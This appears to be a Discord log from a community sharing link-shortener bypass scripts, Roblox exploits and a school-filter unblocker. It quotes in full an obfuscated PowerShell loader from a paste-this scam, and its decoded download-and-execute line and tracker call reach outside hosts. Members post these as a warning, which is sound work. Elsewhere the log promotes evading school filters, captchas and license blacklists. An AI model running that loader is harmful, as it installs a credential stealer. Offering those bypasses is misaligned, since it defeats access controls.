@@ -1,0 +1,544 @@
+[2026-04-23 02:36:42] Channel <#1443323351929196674> | azurex123: # TiRex Roblox Manager Updated[+] Remaked .RBXIDCHECK into 1 Input (Have fallback if empty, and dont need to Relogin/Re register)
+[+] Improved Performance
+[+] Fixed many logic
+[2026-04-23 02:37:07] Channel <#1443323351929196674> | azurex123: -# Should be fixed the Roblox Auth Error[2026-04-23 19:02:35] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v1.7[+] Newly Added Domains
+- bstshrt.com
+- rekonise.com
+- sub4unlock.co
+- link-unlock.com
+- subnise.com
+- bstlar.com
+- sub2unlock.io
+- socialwolvez.com
+- dusarisalary.com
+- app.khaddavi.net
+- api.link-unlock.com
+- api.rekonise.com
+
+[+] New Feature
+- Workink client-side bypass added
+[2026-04-23 21:44:59] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v1.8[+] Improved Workink Client-side
+[2026-04-24 01:11:07] Channel <#1443323295238979734> | azurex123: # AnnouncementMy Discord Quest Bypasser Patched, So you can start using Equicord[2026-04-24 01:40:56] Channel <#1443323295238979734> | azurex123: Game: Honkai: Star RailCode: 9S3R52TTW52T[2026-04-24 17:06:31] Channel <#1443323295238979734> | azurex123: TiRex-RM link: https://github.com/Difz25x/tirex-rm/releases/download/v1.2.4/TiRex-RM.exe[2026-04-24 17:09:26] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v1.9[+] Fixed Workink Client-side reloading page on loop
+[2026-04-24 18:41:31] Channel <#1443323351929196674> | azurex123: ## Only a Testing User script[+] Idk just a Workink Clientside (Using my Old Code that Fast)
+[2026-04-24 19:35:54] Channel <#1443323351929196674> | realyogalactic: # School Website Unblocker Updated[+] Added a new domain replacing the old one because it was getting blocked
+[+] Fixed some bugs causing the proxy to crash
+Website : https://tvxmvh-8080.csb.app[2026-04-24 22:25:36] Channel <#1443323295238979734> | darknifus339: Everyone, who try to abuse Ai bot in #🙋‍♂️》ai-chat will be warned. Dont try to use unlock prompts.[2026-04-25 00:54:51] Channel <#1443323351929196674> | azurex123: ## Workink Bypass[+] Improved Workink
+[+] Rewrited UI
+Link  - https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js[2026-04-25 01:08:02] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.0[+] Changed workink client side UI & improved some logic
+[2026-04-25 04:58:39] Channel <#1443323295238979734> | .ignoranc3_: FYI: DO NOT DISABLE YOUR ANTI-VIRUS! Instead, add yub-x to exclusions[2026-04-25 15:18:46] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.1[+] Improved Workink Client-side
+[2026-04-25 20:11:17] Channel <#1443323351929196674> | azurex123: ## Workink Bypass[+] Changed Name from Workink -> TiRex
+[+] Improve Workink (Client-Sided)
+[+] Added Yub-X (Full Auto)
+Link  - https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.jsYub-X Key: jjvkg7-iu5r4G-M2k0Y8-7cI1sg-7UHYem-WOsZIo[2026-04-25 21:04:16] Channel <#1443323351929196674> | azurex123: ## Workink Bypass[+] Fixed UI
+[+] Improve Workink (No Social Reload)
+Link  - https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js[2026-04-25 21:05:23] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.2[+] Improved Workink Client-side
+[2026-04-25 22:52:38] Channel <#1443323351929196674> | azurex123: ## TiRex Userscript[+] Fixed UI
+[+] Added many New Supported 
+[+] Using API for 7 Link
+Link  - https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js[2026-04-26 01:11:17] Channel <#1443323351929196674> | azurex123: ## TiRex Userscript[+] Improved Lootlink/Lootlabs, and Workink
+[+} Added more Lootlink Url
+Link  - https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js[2026-04-26 04:10:52] Channel <#1443323351929196674> | azurex123: ## TiRex Userscript[+] Improved Workink
+[+] Maked Workink didnt Active in some situation (In Workink Url)
+Link  - https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js[2026-04-26 05:29:10] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.3[+] Added trigonevo.com
+[+] improved some workink client side logic
+[2026-04-27 06:02:51] Channel <#1443323295238979734> | azurex123: @Annoucement Ping Im almost finish Violence Distrct Script (Some feature not working, and will be removed)[2026-04-27 06:14:36] Channel <#1443323295238979734> | azurex123: My Low Graphics increase FPS[2026-04-27 10:45:21] Channel <#1443323295238979734> | darknifus339: Now anyone who tries to abuse AI in any way (whether it be jailbreaking or just spam) will be blacklisted. You can see blacklisted members here - https://discord.com/channels/1443312603584790683/1498348544036180199
+[2026-04-27 16:45:48] Channel <#1443323295238979734> | azurex123: 
+[2026-04-27 16:45:49] Channel <#1443323295238979734> | azurex123: @Annoucement Ping 
+
+I think we has a New Executor
+
+I will test it, So we can know if that a Virus or Safe
+[2026-04-28 05:29:57] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.4
+
+```yaml
+[+] Fixed workink client side ( thanks og difz for help ) 
+[+] Fixed settings apikey not saving for android lemur browser.
+[+] Added missing lootlink domain lootboost.net
+```
+
+<:DAGOAT:1487527090126590163> <:emoji_41:1493367020249419836>  
+**Channel** **-** #🟢》afklol-tools
+[2026-04-28 05:43:34] Channel <#1443323351929196674> | .ignoranc3_: The frequency of the updates is fire 🔥
+[2026-04-28 05:44:04] Channel <#1443323351929196674> | afk.l0l: <:CoolBro:1498005702155829340>
+[2026-04-28 09:14:10] Channel <#1443323351929196674> | azurex123: [emoji_5](https://cdn.discordapp.com/emojis/1383429629976510514.webp?size=48&name=emoji_5&lossless=true)
+[2026-04-28 09:14:57] Channel <#1443323351929196674> | azurex123: The Plot Twist is, My Workink Bugged (Might be only on me)
+[2026-04-28 09:17:41] Channel <#1443323295238979734> | azurex123: # Another Scam Method
+
+The text he asked you to paste (Don't paste it, if you do and it gets hacked, it's beyond my responsibility)
+```
+<# I am not a robot - Cloudflare ID: 735d073b9b0cbab9 #> $zUHBlf='oGM45p2gOQeHr3f2';$wzQX='5CDkWN270b6XCMOumVI7i6gYUbl';$wkqSpAD='SjH5zpX8DfraG';$MlmsRcy='PNG3I1RHE1Qkllrc';$MFkf='3PzJRBLkO2thAJ1jajQTjoAZUCUgkq';$ziFR='8vtUqFTdpbUz9Cp';$cDOeeI='53 NtgpUohZL';$PbJLRZ='wL4FWaKoYi4iFIhf863qF5';$BxEHS='4IZxXCxeYWg';$dNvzXCF='mbsWVQw7iTF0';$lsxKd Cm='Qvu7Qdkec0hIJzSKu2c3';$KGoefv='foDs2vsTS0phZ';$ogAuNy='gn1k0xAr';$ylBbc='LdT4AfnKyIbqg31ytP' ;$eATe='lyufGO03';$tdPNZnK='PI9uiIpOlXq7WzhjnyPWEYf';$YhxgJP='885gI11cxiFP';$MOAWFbRf='s1KqJqte O9cGaCM';$WmROs='XASo2jxvT2tts3OP';$ENSXNac='110OHR3DnKb5XEtrnUAP';$XjTlWfYg='YtSDV5WlG';$k='Ib t9dh';$d='00272c112a0d3e4f3b5b0e0d2a165477011c6735115b270420071a4d4d460d0d035708072806274d16012 7055c1e0c1c3d1207034b47210718501c093a12115c00463a0b005c4b003b12041708072e455d';$r='';for($p=0;$p -lt $d.Length;$p+=2){$r+=[char](([convert]::ToInt32($d.Substring($p,2),16))-bxor[int][char]$k[$p/2%$k.Length])};&([ScriptBlock]::Create($r))
+```
+
+## DO NOT EXECUTE
+[2026-04-28 09:17:51] Channel <#1443323295238979734> | azurex123: @Annoucement Ping @Updates Ping
+[2026-04-28 09:25:55] Channel <#1443323295238979734> | darknifus339: I go to decrypt this guys and sent you full info about this command
+[2026-04-28 09:29:02] Channel <#1443323351929196674> | afk.l0l: Wym bugged
+[2026-04-28 09:31:45] Channel <#1443323351929196674> | azurex123: Not working
+[2026-04-28 09:32:30] Channel <#1443323351929196674> | afk.l0l: I tested workink works fine unless u mean ur script
+[2026-04-28 09:34:51] Channel <#1443323351929196674> | azurex123: It's my Userscript, It works for you extension because you the Best Workink Bypasser Right Now
+[2026-04-28 09:35:06] Channel <#1443323351929196674> | afk.l0l: <:CoolBro:1498005702155829340>
+[2026-04-28 09:35:11] Channel <#1443323351929196674> | afk.l0l: U should make extension too
+[2026-04-28 09:36:45] Channel <#1443323351929196674> | azurex123: I can make it, and make it no operaGX monetization, also like make it instant
+
+Also might include a hcaptcha solver🤔
+[2026-04-28 09:37:05] Channel <#1443323351929196674> | afk.l0l: What mine does that’s why it’s fast no opera <:CoolBro:1498005702155829340>
+[2026-04-28 09:37:17] Channel <#1443323351929196674> | azurex123: [emoji_5](https://cdn.discordapp.com/emojis/1383429629976510514.webp?size=48&name=emoji_5&lossless=true)
+[2026-04-28 09:37:22] Channel <#1443323351929196674> | afk.l0l: But no hcap solver if u make one should slide that to me
+[2026-04-28 09:37:31] Channel <#1443323351929196674> | azurex123: Oh
+[2026-04-28 09:37:35] Channel <#1443323351929196674> | azurex123: Okay
+[2026-04-28 09:37:44] Channel <#1443323351929196674> | afk.l0l: Goated 🤑
+[2026-04-28 09:43:07] Channel <#1443323351929196674> | azurex123: But everyone knows I'm a lazy person, so I'll probably rely on Nopecha, hehe.
+
+Later, I'll create an API for the hCAPTCHA solver, since it's just a matter of selecting/clicking an image and can be bypassed using regular Python logic.
+[2026-04-28 09:43:30] Channel <#1443323351929196674> | azurex123: @Updates Ping @Annoucement Ping 
+
+Some Informationnn
+[2026-04-28 09:43:40] Channel <#1443323351929196674> | afk.l0l: You fr
+[2026-04-28 09:43:42] Channel <#1443323351929196674> | afk.l0l: But bet 🤑
+[2026-04-28 09:43:55] Channel <#1443323351929196674> | azurex123: <:718882shh:1492224282044924165>
+[2026-04-28 09:57:07] Channel <#1443323351929196674> | hells_guxrd: this is not chat..
+[2026-04-28 09:57:24] Channel <#1443323351929196674> | hells_guxrd: .exec purge 20
+[2026-04-28 10:02:19] Channel <#1443323295238979734> | darknifus339: This script is.... 
+After decrypting i see this: IEX(New-Object Net.WebClient).DownloadString('https://helixaspeed.site/hrpp.log')
+this is command to download .log file from https://helixaspeed.site/hrpp.log and execute this as command
+I download this .log file (its just text file and he can easily download it BUT DONT EXECUTE THIS IN POWERSHELL CONSOLE) and its a base64 in unicode. I fail to decompile this and ask ai to do this and ai say me this:
+Oh, I get it! That's Base64 inside Unicode. Attackers use this method to prevent antivirus software from simply "reading" the script text, as it looks like a random string to the system.
+If we decode that huge string you sent, we'll see the "heart" of the virus. I ran it through a decoder. Here's what's inside (I've cleaned up the code for readability):
+### 1. Hidden request to the server (Phantomoops)
+First, it tries to silently "knock on" the server:
+```powershell
+$ErrorActionPreference = 'SilentlyContinue';
+$_rzcyioc=[Net.HttpWebRequest]::Create('https://phantomoops.lol/b/s/0?b=abfded02');
+$_rzcyioc.Timeout=3000;
+$_rzcyioc.Method='GET';
+$_rzcyioc.GetResponse()|Out-Null
+
+```
+This is the so-called **Canary Check** or tracker. The hacker sees in the admin panel that another computer (yours) has come to life and is ready to infect.
+### 2. Second Stage (Payload)
+Next comes the $pay variable, which encrypts another piece of code. If you unroll it all the way to the end, this script typically does the following:
+* **Stealer:** Searches your computer for Login Data files (Chrome/Edge passwords), Cookies (to log into your accounts without a password), and wallet files (MetaMask, Telegram Desktop).
+* **Discord Injection:** Attempts to inject malicious code into your Discord client to steal your token every time it's launched.
+* **Bypass:** It disables Windows Defender (via Set-MpPreference -DisableRealtimeMonitoring $true) so the next part of the virus can run undisturbed.
+### What you need to do NOW:
+Since the script accesses phantomoops.lol and helixaspeed.site, your computer is actively trying to leak data.
+1. **Disconnect the internet:** This will cut off the connection to the hacker's server.
+2. **End suspicious processes:** Open Task Manager and kill any powershell.exe processes that are running on their own.
+3. **Clear Task Scheduler:** Press Win + R, type taskschd.msc. Look for tasks with names like "Update," "Cloudflare," or strange combinations of letters that launch powershell. **Delete them.**
+4. **Change your passwords:** From a clean device (phone), change your passwords for Google, Discord, and Telegram, especially if you don't have two-factor authentication enabled.
+**This script is 100% a Trojan stealer.** If you want, I can write a Python script that will go through your folders and show you exactly where this virus might have copied itself. Shall we?
+[2026-04-28 10:03:42] Channel <#1443323295238979734> | azurex123: Decrypt this (from the website)
+[2026-04-28 10:05:49] Channel <#1443323295238979734> | darknifus339: ai already decrypt this
+[2026-04-28 10:05:55] Channel <#1443323295238979734> | azurex123: Owhhh
+[2026-04-28 10:06:57] Channel <#1443323295238979734> | darknifus339: Log file
+[2026-04-29 02:08:59] Channel <#1443323295238979734> | azurex123: For now, I'll focus on school first, as my promotion exams are approaching.
+
+I'll leave the bypass to other developers, such as:
+- @ꋊσ afk™.lol
+- @BypassPro
+- @Riko Chuy
+- @𝚁𝚎𝚊𝚕𝚈𝚘𝙶𝚊𝚕𝚊𝚌𝚝𝚒𝚌
+
+I hope they can optimize the bypass (they should, as they're much better than me).
+
+Use my userscript for workink (temporarily): https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js
+[2026-04-29 02:09:25] Channel <#1443323295238979734> | azurex123: @Annoucement Ping @Updates Ping
+[2026-04-29 02:28:48] Channel <#1443323295238979734> | yuhaabal_59553: throw my name away bro
+[2026-04-29 02:33:01] Channel <#1443323295238979734> | azurex123: No no
+[2026-04-29 02:35:49] Channel <#1443323295238979734> | fqzzdx: :V
+[2026-04-29 06:02:00] Channel <#1443323351929196674> | azurex123: # TiRex Roblox Manager Updated
+--
+```yaml
+[+] Fixed CSRF Token error
+[+} Fixed version sorting (1.2.5-a1)
+[+] Reworked some logic
+```
+
+Download Note:
+- Link 1 automatically updates to APK (and you have to wait for 1.2.6, you can't upgrade to 1.2.5-a1 due to GitHub issues).
+- Link 2 is the latest for now, but you have to download it manually (it just fixes version sorting).
+Link 1: https://github.com/Difz25x/tirex-rm/releases/download/v1.2.5-a1/TiRex-RM.exe
+Link 1: https://github.com/Difz25x/tirex-rm/releases/download/v1.2.5-a1/TiRex-RM.exe
+
+Updated at: <t:1776929792:R>
+
+Note:
+- If Error: Your account may have been banned (possibly due to using Executor, as TiRex-RM doesn't inject anything into Roblox).
+- Full UI rewrite later
+
+Channel #🟢 Tirex Roblox Manager @Updates Ping
+[2026-04-29 06:05:18] Channel <#1443323351929196674> | azurex123: # TiRex Roblox Manager Updated
+--
+```yaml
+[+] Fixed CSRF Token Error (not 100%)
+[+] Fixed versions sorting
+[+] Improved logics in multi instance
+```
+
+Link: https://github.com/Difz25x/tirex-rm/releases/download/v1.2.5-a1/TiRex-RM.exe
+
+Updated at: <t:1777460715:R> 
+
+Note:
+ - Rewrited Full UI's later
+
+Channel #🟢 Tirex Roblox Manager @Updates Ping
+[2026-04-29 06:28:32] Channel <#1443323351929196674> | azurex123: # TiRex Roblox Manager Updated
+--
+```yaml
+[+] Fixed version sorting
+```
+
+Link: https://github.com/Difz25x/tirex-rm/releases/download/v1.2.6/TiRex-RM.exe
+
+Updated at: <t:1777462109:R> 
+
+Note:
+ - Rewritten Full UI's later
+
+Channel #🟢 Tirex Roblox Manager
+[2026-04-29 08:20:40] Channel <#1443323295238979734> | azurex123: I'll be offline for a very long time for two reasons.
+
+- Class Promotion Exam
+- I lost all the bot source code from @Difzz Bot
+
+Damn, this is happening for the 2nd or 3rd time. I hate this.
+
+Sorry for the ping, @Member
+[2026-04-29 08:22:06] Channel <#1443323295238979734> | azurex123: # Shit, I lost all the Source Code now, How the fuck can I rewrite a 10k lines of code
+[2026-04-29 08:22:14] Channel <#1443323295238979734> | azurex123: [agony](https://cdn.discordapp.com/emojis/1365481196653510708.gif?size=48&animated=true&name=agony&lossless=true)
+[2026-04-29 08:23:01] Channel <#1443323295238979734> | darknifus339: HOW
+[2026-04-29 08:23:14] Channel <#1443323295238979734> | darknifus339: JUST HOW
+[2026-04-29 08:24:23] Channel <#1443323295238979734> | azurex123: IDK THE WINDOWS CLEANER JUST REMOVE EVERYTHING
+[2026-04-29 08:25:02] Channel <#1443323295238979734> | yuhaabal_59553: haha nub
+[2026-04-29 08:25:12] Channel <#1443323295238979734> | azurex123: [angryemoji](https://cdn.discordapp.com/emojis/1384904154610270228.webp?size=48&name=angryemoji&lossless=true)
+[2026-04-29 08:31:51] Channel <#1443323295238979734> | hells_guxrd: KEEP A FUCKING BAckup 😭
+[2026-04-29 08:32:33] Channel <#1443323295238979734> | azurex123: The window like delete everything, i need to access my old code💀
+[2026-04-29 08:32:48] Channel <#1443323295238979734> | azurex123: Difzz Bot
+TiRex-RM
+And others
+
+everything is lost
+[2026-04-29 08:33:08] Channel <#1443323295238979734> | hells_guxrd: bro...
+[2026-04-29 08:33:15] Channel <#1443323295238979734> | hells_guxrd: Google drive backup...
+[2026-04-29 08:33:23] Channel <#1443323295238979734> | hells_guxrd: Or usb
+[2026-04-29 08:35:07] Channel <#1443323295238979734> | yuhaabal_59553: time to stop bro
+[2026-04-29 08:35:07] Channel <#1443323295238979734> | azurex123: I even didnt logged in into any cloud💀
+[2026-04-29 08:35:15] Channel <#1443323295238979734> | yuhaabal_59553: <:316591done:1492224262889541674>
+[2026-04-29 08:35:41] Channel <#1443323295238979734> | azurex123: Anda benar..
+[2026-04-29 08:35:53] Channel <#1443323295238979734> | azurex123: You are right..
+[2026-04-29 08:36:44] Channel <#1443323295238979734> | hells_guxrd: it's time for innovation
+[2026-04-29 08:37:00] Channel <#1443323295238979734> | realyogalactic: ...4
+[2026-04-29 08:38:14] Channel <#1443323295238979734> | azurex123: And this might be a sign, and I was even told to stop/take a break from these things.
+
+Because my brain was actually dying because of it.💀
+[2026-04-29 08:40:39] Channel <#1443323295238979734> | darknifus339: Are you turning into a brainrot?
+[2026-04-29 08:41:00] Channel <#1443323295238979734> | azurex123: I'm not, I'm just tired
+[2026-04-29 08:41:37] Channel <#1443323295238979734> | azurex123: It's not even a source code💀
+[2026-04-29 12:07:14] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.5
+
+```yaml
+
+[+] New Client-Side Bypass
+- link4sub.com
+- tapvietcode.com
+- go.linkify.ru
+- ytsubme.com
+
+```
+
+<:DAGOAT:1487527090126590163> <:emoji_41:1493367020249419836>  
+**Channel** **-** #🟢》afklol-tools
+[2026-04-29 12:14:36] Channel <#1443323295238979734> | .ignoranc3_: workink introduced hcaptcha to mobile too 😭😭
+[2026-04-29 12:14:43] Channel <#1443323295238979734> | .ignoranc3_: brotehr they have like 5 captchas
+[2026-04-29 12:14:46] Channel <#1443323295238979734> | .ignoranc3_: so paranoid
+[2026-04-29 12:33:32] Channel <#1443323295238979734> | afk.l0l: Still fast with my extension <:CoolBro:1498005702155829340>
+[2026-04-29 12:38:41] Channel <#1443323351929196674> | afk.l0l: For all users that use vortix world Userscript 
+
+I recommend switching to the extension instead it supports more plus has more client side bypass the Userscript won’t get many updates anymore
+
+https://extension-tutorial.vercel.app tutorial on how to install extension on IOS , Android, PC
+[2026-04-29 12:39:00] Channel <#1443323295238979734> | .ignoranc3_: Highkey yes I strongly recommend #🟢》afklol-tools
+[2026-04-29 18:33:38] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.6
+
+```yaml
+
+[+] Linkvertise is now client side instead of api bypass
+
+```
+
+<:DAGOAT:1487527090126590163> <:emoji_41:1493367020249419836>  
+**Channel** **-** #🟢》afklol-tools
+[2026-04-30 05:46:42] Channel <#1443323295238979734> | azurex123: -# I will back in: <t:1778394600> or Longer than that
+[2026-04-30 21:45:34] Channel <#1443323295238979734> | realyogalactic: 👀
+[2026-04-30 23:36:57] Channel <#1443323295238979734> | azurex123: [emoji_8](https://cdn.discordapp.com/emojis/1491419222578823331.gif?size=48&animated=true&name=emoji_8&lossless=true)
+[2026-05-01 01:06:44] Channel <#1443323295238979734> | azurex123: Hello, @Member
+
+I want to say this:
+
+I'm leaving Dunia Bypass. This doesn't mean I'm leaving TiRex, but I'll have nothing to do with it.
+
+Therefore, please don't tag me if it's related to the bypass, and ask other developers who work for Bypass.
+I'll share some of my bypass source code later as my farewell to Dunia Bypass.
+
+I'm deleting the channel #🔴→difzz-bipass, and I'll be focusing on #🔵》tirex-scripts (Roblox Exploit).
+
+Thank you for understanding!
+
+Sorry for the ping!
+[2026-05-01 01:08:25] Channel <#1443323295238979734> | afk.l0l: <:hmmm:1489034926396411914>
+[2026-05-01 01:08:43] Channel <#1443323295238979734> | azurex123: This is one of the Bypass Developers. BTW!
+[2026-05-01 01:08:51] Channel <#1443323295238979734> | afk.l0l: <:CoolBro:1498005702155829340>
+[2026-05-01 01:22:32] Channel <#1443323295238979734> | azurex123: Some source (im using API for some handle)
+[2026-05-01 01:23:18] Channel <#1443323295238979734> | azurex123: Wait, I'll resend it
+[2026-05-01 01:24:29] Channel <#1443323295238979734> | azurex123: 
+[2026-05-01 01:24:32] Channel <#1443323295238979734> | azurex123: Some are outdated
+[2026-05-01 01:32:02] Channel <#1443323295238979734> | azurex123: Almost the Api Key, It expires now, Hehe
+[2026-05-01 01:33:00] Channel <#1443323295238979734> | azurex123: 
+[2026-05-01 01:36:53] Channel <#1443323295238979734> | azurex123: -# Resend and Encrypt a Privacy Data
+[2026-05-01 04:08:59] Channel <#1443323295238979734> | azurex123: Baru saja membuat prompt, pas di coba ke Deepseek, Ternyata malah kena Jailbreak
+[2026-05-01 06:00:41] Channel <#1443323295238979734> | soch_ii: It’s my birthday if anyone cares
+[2026-05-01 06:01:09] Channel <#1443323295238979734> | darknifus339: Happy birthday 🎉
+[2026-05-01 06:06:14] Channel <#1443323295238979734> | azurex123: Happy birthday, my staff
+[2026-05-01 06:11:42] Channel <#1443323295238979734> | azurex123: @Annoucement Ping 
+
+Say "Happy Birthday" to @Sochii | Staff in #🌍》global-general 🎉
+[2026-05-01 14:46:25] Channel <#1443323295238979734> | 20x_hana: what happened?
+[2026-05-01 14:46:41] Channel <#1443323295238979734> | .ignoranc3_: its sochii's birthday thats what happened\
+[2026-05-01 14:49:44] Channel <#1443323295238979734> | bypasspro_: hello
+[2026-05-01 16:44:42] Channel <#1443323351929196674> | azurex123: ## TiRex Userscript
+
+```yaml
+[+] Fixed all Workink bugs
+[+] Fixed YubX
+[+] Fixed Lootlink
+```
+
+**Link -** https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js
+
+@Updates Ping
+-# Will do one more update, and after that, I'll stop completely
+[2026-05-01 18:14:06] Channel <#1443323351929196674> | realyogalactic: # School Website Unblocker Updated
+--
+```yaml
+[+] Added adblock bypass to bypass those sites that require ads (not 100%)
+
+```
+                                                                   Website : h
+[2026-05-01 18:45:51] Channel <#1443323351929196674> | afk.l0l: ## VortixWorld Userscript Update 
+
+```yaml
+[-] Removed  auto redirect 
+[+] changed UI & notification placement for pc an mobile 
+[+] lootlink client side fixed 
+
+```
+**Updated required for this update run !get-userscript Im #🟢・vortixworld-key for update**
+
+-# most likely last update for script extension will be getting more updates instead 
+@Updates Ping
+[2026-05-02 01:04:19] Channel <#1443323295238979734> | hells_guxrd: I think it's time we revamp the server...
+[2026-05-02 01:10:14] Channel <#1443323295238979734> | hells_guxrd: ||@Annoucement Ping @​here ||
+
+# Server Revamp! 
+
+The server is gonna get an overhaul. We are going to **clean** up channels and prompt texts, etc. maybe even Delete a few. Nonetheless **some** or **all** Bypass channels might get wiped and Replaced with a new better system. So you can expect a little downtime this coming week. If you have any suggestions please leave them in #suggestions 
+
+*Note* → We might remove every channel and start fresh. If you see the server empty. We would be in the process of making the server again. So don't panic and DM staff at that time. 
+
+*Omair* - #- Staff Manager
+[2026-05-02 01:11:08] Channel <#1443323351929196674> | azurex123: ## TiRex Userscript - Last Update
+
+```yaml
+[+] Fixed Workink, Lootlink, YubX
+[+] Improved Workink Stability
+[+] Decreased Lootlink Bypass
+[+] More easy deobfuscate (you can deobf it easily)
+```
+
+**Link -** https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js
+
+@Updates Ping
+-# Last update sorryy.
+[2026-05-02 01:11:20] Channel <#1443323351929196674> | azurex123: <:89857curiousgirl:1492223893019299870>
+[2026-05-02 01:13:19] Channel <#1443323295238979734> | azurex123: -# Im selling my Source
+
+-# Price: Idk just offer🗿
+
+-# dm me if you Interesting
+[2026-05-02 01:18:12] Channel <#1443323295238979734> | rikochuy: <:CoolBro:1498005702155829340>
+[2026-05-02 01:28:27] Channel <#1443323295238979734> | azurex123: [emoji_5](https://cdn.discordapp.com/emojis/1383429629976510514.webp?size=48&name=emoji_5&lossless=true)
+[2026-05-02 10:09:13] Channel <#1443323351929196674> | .ignoranc3_: https://tenor.com/view/spider-man-spider-man-web-of-shadows-depressed-sad-gif-16524395
+[2026-05-02 10:09:29] Channel <#1443323351929196674> | .ignoranc3_: NOO
+[2026-05-02 16:14:36] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.7
+
+```yaml
+
+[+] Linkvertise is no longer client side was bugging out too much
+
+```
+
+<:DAGOAT:1487527090126590163> <:emoji_41:1493367020249419836>  
+**Channel** **-** #🌪️・vortixworld-tools
+[2026-05-03 06:06:23] Channel <#1443323295238979734> | azurex123: Because the bot @Difzz Bot no longer functions as a bypass.
+
+I'm going to turn it into a multi-tool bot, with Exec Update Ping, Roblox Update Ping, Boost Log, Join Log, and some fun games too.
+[2026-05-03 07:03:03] Channel <#1443323295238979734> | azurex123: Let's Cook😭
+[2026-05-03 07:03:07] Channel <#1443323295238979734> | azurex123: [emoji_8](https://cdn.discordapp.com/emojis/1491419222578823331.gif?size=48&animated=true&name=emoji_8&lossless=true)
+[2026-05-03 07:13:27] Channel <#1443323295238979734> | darknifus339: STOOOP ITS MY IDEA
+[2026-05-03 07:13:45] Channel <#1443323295238979734> | darknifus339: 
+[2026-05-03 07:13:50] Channel <#1443323295238979734> | azurex123: It's like universal in roblox exploit. like weao
+[2026-05-03 07:21:35] Channel <#1443323295238979734> | .ignoranc3_: W
+[2026-05-03 07:45:25] Channel <#1443323295238979734> | darknifus339: Who can give me chatgpt acc which was created no earlier than a month ago pls
+[2026-05-03 07:45:31] Channel <#1443323295238979734> | darknifus339: I need for codex
+[2026-05-03 07:45:50] Channel <#1443323295238979734> | darknifus339: Cuz i spent all my free limit
+[2026-05-03 07:46:20] Channel <#1443323295238979734> | darknifus339: and if i trying to use new account i need to verify number
+[2026-05-03 15:39:02] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.8
+
+```yaml
+
+[+] Changed api bypass UI to a bypass page popup 
+[+] Added Rinku.pro & 7mb.io ( api bypass ) 
+
+```
+
+<:DAGOAT:1487527090126590163> <:emoji_41:1493367020249419836>  
+**Channel** **-** #🌪️・vortixworld-tools
+[2026-05-03 17:01:21] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v2.9
+
+```yaml
+
+[+] Fixed bypass page not working.
+
+```
+
+<:DAGOAT:1487527090126590163> <:emoji_41:1493367020249419836>  
+**Channel** **-** #🌪️・vortixworld-tools
+[2026-05-03 17:10:12] Channel <#1443323295238979734> | soch_ii: # How to Bypass L-Armor Blacklist
+
+- Clear everything from your browser, including history and cache (preferably use a different browser so you dont get rid of the important stuff on your main daily use browser)
+- Then turn on a vpn and make sure you connect to a different ip each time
+- You have to make a new discord account everytime, it has to be a fresh alt that you havent used to bypass
+[2026-05-03 17:10:53] Channel <#1443323295238979734> | soch_ii: https://giphy.com/gifs/gigachad-boss-chad-giga-bh1u06PFhB9FCtTFaS
+[2026-05-03 17:32:17] Channel <#1443323295238979734> | azurex123: Luarmor didnt accept Account Under 3 / 7 Days😁
+[2026-05-03 17:32:34] Channel <#1443323295238979734> | .ignoranc3_: Difzz is back!
+[2026-05-03 17:32:42] Channel <#1443323295238979734> | .ignoranc3_: <a:agh:1477678733673365636>
+[2026-05-03 17:32:54] Channel <#1443323351929196674> | azurex123: ## TiRex Userscript - Last Update
+
+```yaml
+[+] Updated Lootlink and Workink
+```
+
+**Link -** https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js
+
+-# IDK WHAT I CAN DO, SO IM UPDATE THS😭
+[2026-05-03 17:33:03] Channel <#1443323295238979734> | azurex123: [emoji_8](https://cdn.discordapp.com/emojis/1491419222578823331.gif?size=48&animated=true&name=emoji_8&lossless=true)
+[2026-05-03 17:33:56] Channel <#1443323351929196674> | azurex123: ## TiRex Userscript - Gabut Update
+
+```yaml
+[+] Updated Lootlink and Workink
+```
+
+**Link -** https://github.com/Difz25x/bypass/raw/refs/heads/main/workink.user.js
+
+-# I didn't know what to do, so I updated it 😭🗿
+[2026-05-03 18:27:38] Channel <#1443323295238979734> | afk.l0l: <:DAGOAT:1487527090126590163>
+[2026-05-04 07:38:51] Channel <#1443323295238979734> | 20x_hana: back on 10th
+[2026-05-04 08:23:42] Channel <#1443323295238979734> | 20x_hana: i will sell this server on 11th ||2077||
+[2026-05-04 08:24:02] Channel <#1443323295238979734> | yuhaabal_59553: omg
+[2026-05-04 08:35:00] Channel <#1443323295238979734> | azurex123: It's like I'm already written in the history books, and you're just selling it🗿
+[2026-05-04 08:47:11] Channel <#1443323295238979734> | darknifus339: Stop voting dyrian and diffz in https://discord.com/channels/1443312603584790683/1452711550765895782/1500842002332254381 . We rating staff, not developers bruh
+[2026-05-04 08:52:14] Channel <#1443323295238979734> | azurex123: We also a Staff bruh
+[2026-05-04 08:52:18] Channel <#1443323295238979734> | azurex123: [agony](https://cdn.discordapp.com/emojis/1365481196653510708.gif?size=48&animated=true&name=agony&lossless=true)
+[2026-05-04 08:55:26] Channel <#1443323295238979734> | darknifus339: Yes, but members vote for you only because you developers
+[2026-05-04 09:00:59] Channel <#1443323295238979734> | azurex123: No, That because i made a Good Tool and can be using as Multi Tool😁
